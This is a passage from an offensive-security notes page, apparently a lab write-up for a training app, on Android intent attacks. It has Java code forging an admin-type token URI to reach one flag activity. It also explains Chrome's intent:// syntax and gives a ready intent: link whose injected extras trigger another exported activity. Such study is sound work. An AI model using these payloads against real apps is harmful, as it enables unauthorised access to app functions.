+<div class="sourceCode" id="cb8"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a>Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb8-2"><a href="#cb8-2" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> <span class="op">(</span>intent <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-3"><a href="#cb8-3" aria-hidden="true" tabindex="-1"></a>    Uri data <span class="op">=</span> intent<span class="op">.</span><span class="fu">getData</span><span class="op">();</span></span>
+<span id="cb8-4"><a href="#cb8-4" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> <span class="op">(</span>data <span class="op">!=</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb8-5"><a href="#cb8-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-6"><a href="#cb8-6" aria-hidden="true" tabindex="-1"></a>        Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">();</span></span>
+<span id="cb8-7"><a href="#cb8-7" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setComponent</span><span class="op">(</span><span class="kw">new</span> <span class="fu">ComponentName</span><span class="op">(</span><span class="st">&quot;io.hextree.attacksurface&quot;</span><span class="op">,</span> <span class="st">&quot;io.hextree.attacksurface.activities.Flag14Activity&quot;</span><span class="op">));</span></span>
+<span id="cb8-8"><a href="#cb8-8" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">);</span></span>
+<span id="cb8-9"><a href="#cb8-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-10"><a href="#cb8-10" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> authToken <span class="op">=</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;authToken&quot;</span><span class="op">);</span></span>
+<span id="cb8-11"><a href="#cb8-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> authChallenge <span class="op">=</span> data<span class="op">.</span><span class="fu">getQueryParameter</span><span class="op">(</span><span class="st">&quot;authChallenge&quot;</span><span class="op">);</span></span>
+<span id="cb8-12"><a href="#cb8-12" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb8-13"><a href="#cb8-13" aria-hidden="true" tabindex="-1"></a>        Uri uri <span class="op">=</span> Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;hex://token?&quot;</span> <span class="op">+</span></span>
+<span id="cb8-14"><a href="#cb8-14" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;authToken=&quot;</span> <span class="op">+</span> authToken <span class="op">+</span></span>
+<span id="cb8-15"><a href="#cb8-15" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;&amp;type=admin&quot;</span> <span class="op">+</span></span>
+<span id="cb8-16"><a href="#cb8-16" aria-hidden="true" tabindex="-1"></a>                <span class="st">&quot;&amp;authChallenge=&quot;</span> <span class="op">+</span> authChallenge</span>
+<span id="cb8-17"><a href="#cb8-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">);</span></span>
+<span id="cb8-18"><a href="#cb8-18" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setAction</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">);</span></span>
+<span id="cb8-19"><a href="#cb8-19" aria-hidden="true" tabindex="-1"></a>        intent2<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>uri<span class="op">);</span></span>
+<span id="cb8-20"><a href="#cb8-20" aria-hidden="true" tabindex="-1"></a>        <span class="fu">startActivity</span><span class="op">(</span>intent2<span class="op">);</span></span>
+<span id="cb8-21"><a href="#cb8-21" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span></code></pre></div>
+<hr />
+<h2 id="generic-chrome-intent">Generic chrome intent</h2>
+<p>The <code>intent://</code> scheme is a specialized URI format used within Chrome for Android to allow web pages to trigger an Android Intent. This mechanism is primarily used for deep linking to launch a specific native Android application or an Activity within an app directly from a web page.</p>
+<p><strong>How it Works</strong></p>
+<p>Unlike standard URI schemes (like <code>myapp://</code>) which may have inconsistent fallback behavior across different browsers, the <code>intent://</code> scheme provides a structured way for the Chrome browser to parse the request and execute the Intent via the Android system, including built-in fallback options.</p>
+<ol type="1">
+<li>A user clicks a link (typically an <code>&lt;a&gt;</code> tag) on a web page whose href attribute uses the <code>intent://</code> format.</li>
+<li>Chrome for Android parses this URI.</li>
+<li>Chrome attempts to resolve and launch an installed Android application that has an appropriate Intent Filter matching the details specified in the URI.</li>
+<li>If a matching app is found, the app is launched.</li>
+<li>If no matching app is found, the system can fall back to an alternative action, such as redirecting the user to the app’s page on the Google Play Store or to a specified fallback URL.</li>
+</ol>
+<blockquote>
+<p><strong>Note</strong>: Only activities with the category filter, <code>android.intent.category.BROWSABLE</code> can be <a href="https://developer.chrome.com/docs/android/intents">invoked using this method</a>, as it indicates that the application is safe to open from the Browser</p>
+</blockquote>
+<p><strong>Intent URI Syntax</strong></p>
+<p>Here’s a breakdown of the key components (Refer to the <a href="https://cs.android.com/android/platform/superproject/main/+/main:frameworks/base/core/java/android/content/Intent.java?q=symbol:Intent.parseUri">Android source code</a> for parsing details):</p>
+<ul>
+<li><code>intent:</code>: The required prefix for Chrome to recognize the URI as an Android Intent. Use <code>intent://</code> when the Intent carries a data URI, and just <code>intent:</code> when it doesn’t.</li>
+<li><code>HOST/URI-path</code>: Optional. The data URI host and path passed to the Intent (e.g., <code>scan/</code> in a barcode scanner example).</li>
+<li><code>#Intent;</code>: A fixed separator.</li>
+<li><code>scheme=[string]</code>: Optional. The scheme of the data URI (e.g., <code>zxing</code> or <code>https</code>), which must match the <code>&lt;data&gt;</code> of the target activity’s intent filter. Combined with <code>HOST/URI-path</code>, it builds the data URI (e.g., <code>zxing://scan/</code>).</li>
+<li><code>package=[string]</code>: Optional. Restricts the Intent to a specific app (e.g., <code>com.google.zxing.client.android</code>). If the app isn’t installed, Chrome can redirect to its Play Store page.</li>
+<li><code>action=[string]</code>: The desired Intent action (e.g., <code>android.intent.action.VIEW</code>).</li>
+<li><code>category=[string]</code>: Specifies an Intent category (e.g., <code>android.intent.category.BROWSABLE</code>). The target Activity must include the <code>android.intent.category.BROWSABLE</code> category in its manifest filter to be launchable from a web browser.</li>
+<li><code>S.browser_fallback_url=[encoded_full_url]</code>: Optional. A String Extra (S.) used by Chrome to specify a URL to redirect the user to if the Intent cannot be resolved (i.e., the app isn’t installed). This URL must be URL-encoded.</li>
+<li><code>[type].[name]=[value]</code>: Used to pass Intent Extras. The single character prefix specifies the data type (S. for String, i. for Integer, etc.).
+<ul>
+<li>S - String</li>
+<li>B - Boolean</li>
+<li>b - Byte</li>
+<li>c - Char</li>
+<li>d - Double</li>
+<li>f - Float</li>
+<li>i - Int</li>
+<li>l - Long</li>
+</ul></li>
+<li><code>end;</code>: The required terminator for the Intent URI definition.</li>
+</ul>
+<p><strong>Example</strong></p>
+<p>To launch the ZXing barcode scanner app and fall back to its website if the app isn’t installed:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;</span><span class="kw">a</span> <span class="er">href</span><span class="ot">=</span><span class="st">&quot;intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;S.browser_fallback_url=http%3A%2F%2Fzxing.org;end&quot;</span><span class="dt">&gt;</span></span>
+<span id="cb9-2"><a href="#cb9-2" aria-hidden="true" tabindex="-1"></a>    Take a QR code</span>
+<span id="cb9-3"><a href="#cb9-3" aria-hidden="true" tabindex="-1"></a><span class="dt">&lt;/</span><span class="kw">a</span><span class="dt">&gt;</span></span></code></pre></div>
+<blockquote>
+<p><strong>What’s the security problem?</strong></p>
+<p>This chrome feature increases the threat surface massively of any app because you can also add <strong>extras value</strong>!</p>
+</blockquote>
+<h3 id="example">Example</h3>
+<p>Let’s say that the app <code>io.hextree.attacksurface</code> has the following activity:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">activity</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:name=</span><span class="st">&quot;io.hextree.attacksurface.activities.Flag15Activity&quot;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="ot">    android:exported=</span><span class="st">&quot;true&quot;</span>&gt;</span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">action</span><span class="ot"> android:name=</span><span class="st">&quot;io.hextree.action.GIVE_FLAG&quot;</span>/&gt;</span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.DEFAULT&quot;</span>/&gt;</span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">category</span><span class="ot"> android:name=</span><span class="st">&quot;android.intent.category.BROWSABLE&quot;</span>/&gt;</span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">intent-filter</span>&gt;</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">activity</span>&gt;</span></code></pre></div>
+<div class="sourceCode" id="cb11"><pre class="sourceCode java"><code class="sourceCode java"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a><span class="kw">public</span> <span class="kw">class</span> Flag15Activity <span class="kw">extends</span> AppCompactActivity <span class="op">{</span></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>    <span class="kw">public</span> <span class="fu">Flag15Activity</span><span class="op">()</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a>    <span class="kw">private</span> <span class="dt">boolean</span> <span class="fu">isDeeplink</span><span class="op">(</span>Intent intent<span class="op">)</span> <span class="op">{</span><span class="kw">...</span><span class="op">}</span></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>    <span class="at">@Override</span></span>
+<span id="cb11-7"><a href="#cb11-7" aria-hidden="true" tabindex="-1"></a>    <span class="kw">protected</span> <span class="dt">void</span> <span class="fu">onCreate</span><span class="op">(</span>Bundle bundle<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-8"><a href="#cb11-8" aria-hidden="true" tabindex="-1"></a>        <span class="kw">super</span><span class="op">.</span><span class="fu">onCreate</span><span class="op">(</span>bundle<span class="op">);</span></span>
+<span id="cb11-9"><a href="#cb11-9" aria-hidden="true" tabindex="-1"></a>        Intent intent <span class="op">=</span> <span class="fu">getIntent</span><span class="op">();</span></span>
+<span id="cb11-10"><a href="#cb11-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>intent <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span><span class="cf">return</span><span class="op">;}</span></span>
+<span id="cb11-11"><a href="#cb11-11" aria-hidden="true" tabindex="-1"></a>        <span class="bu">String</span> action <span class="op">=</span> intent<span class="op">.</span><span class="fu">getAction</span><span class="op">();</span></span>
+<span id="cb11-12"><a href="#cb11-12" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>action <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb11-13"><a href="#cb11-13" aria-hidden="true" tabindex="-1"></a>            Intent intent2 <span class="op">=</span> <span class="kw">new</span> <span class="fu">Intent</span><span class="op">(</span><span class="st">&quot;android.intent.action.VIEW&quot;</span><span class="op">);</span></span>
+<span id="cb11-14"><a href="#cb11-14" aria-hidden="true" tabindex="-1"></a>            intent2<span class="op">.</span><span class="fu">setData</span><span class="op">(</span>Uri<span class="op">.</span><span class="fu">parse</span><span class="op">(</span><span class="st">&quot;https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=&quot;</span> <span class="op">+</span> Uri<span class="op">.</span><span class="fu">encode</span><span class="op">(</span><span class="st">&quot;intent:#Intent;...&quot;</span><span class="op">)));</span></span>
+<span id="cb11-15"><a href="#cb11-15" aria-hidden="true" tabindex="-1"></a>            <span class="fu">startActivity</span><span class="op">(</span>intent2<span class="op">);</span></span>
+<span id="cb11-16"><a href="#cb11-16" aria-hidden="true" tabindex="-1"></a>            <span class="cf">return</span><span class="op">;</span></span>
+<span id="cb11-17"><a href="#cb11-17" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb11-18"><a href="#cb11-18" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span><span class="fu">isDeeplink</span><span class="op">(</span>intent<span class="op">)</span> <span class="op">&amp;&amp;</span> action<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;io.hextree.action.GIVE_FLAG&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb11-19"><a href="#cb11-19" aria-hidden="true" tabindex="-1"></a>            Bundle extras <span class="op">=</span> intent<span class="op">.</span><span class="fu">getExtras</span><span class="op">();</span></span>
+<span id="cb11-20"><a href="#cb11-20" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>extras <span class="op">==</span> <span class="kw">null</span><span class="op">)</span> <span class="op">{</span><span class="fu">finish</span><span class="op">();}</span></span>
+<span id="cb11-21"><a href="#cb11-21" aria-hidden="true" tabindex="-1"></a>            <span class="bu">String</span> string <span class="op">=</span> extras<span class="op">.</span><span class="fu">getString</span><span class="op">(</span><span class="st">&quot;action&quot;</span><span class="op">,</span> <span class="st">&quot;open&quot;</span><span class="op">);</span></span>
+<span id="cb11-22"><a href="#cb11-22" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>extras<span class="op">.</span><span class="fu">getBoolean</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">,</span> <span class="kw">false</span><span class="op">)</span> <span class="op">&amp;&amp;</span> string<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;flag&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb11-23"><a href="#cb11-23" aria-hidden="true" tabindex="-1"></a>                <span class="fu">success</span><span class="op">(</span><span class="kw">this</span><span class="op">);</span></span>
+<span id="cb11-24"><a href="#cb11-24" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>string<span class="op">.</span><span class="fu">equals</span><span class="op">(</span><span class="st">&quot;open&quot;</span><span class="op">))</span> <span class="op">{</span></span>
+<span id="cb11-25"><a href="#cb11-25" aria-hidden="true" tabindex="-1"></a>                Toast<span class="op">.</span><span class="fu">makeText</span><span class="op">(</span><span class="kw">this</span><span class="op">,</span> <span class="st">&quot;Website: &quot;</span> <span class="op">+</span> extras<span class="op">.</span><span class="fu">getString</span><span class="op">(</span><span class="st">&quot;message&quot;</span><span class="op">,</span> <span class="st">&quot;open&quot;</span><span class="op">),</span> <span class="dv">1</span><span class="op">).</span><span class="fu">show</span><span class="op">();</span></span>
+<span id="cb11-26"><a href="#cb11-26" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb11-27"><a href="#cb11-27" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb11-28"><a href="#cb11-28" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb11-29"><a href="#cb11-29" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>To get the flag you can create a link like the follows:</p>
+<pre><code>intent:#Intent;action=io.hextree.action.GIVE_FLAG;package=io.hextree.attacksurface;component=io.hextree.attacksurface/io.hextree.attacksurface.activities.Flag15Activity;S.action=flag;B.flag=true;end</code></pre>
+<blockquote>
+<p><strong>Note</strong>:</p>
+<p>The target <code>&lt;intent-filter&gt;</code> does not contain a host or path filter, so do not create a data URI <code>intent://</code>, instead do <code>intent:</code>.</p>
+</blockquote>
+  <hr>
+  <footer>
+    <p align="center">
+      <a href="https://github.com/frankheat/offsecnotes">Source code</a> •
+      <a href="https://github.com/frankheat">frankheat</a>
+    </p>
+  </footer>
+</body>
+</html>
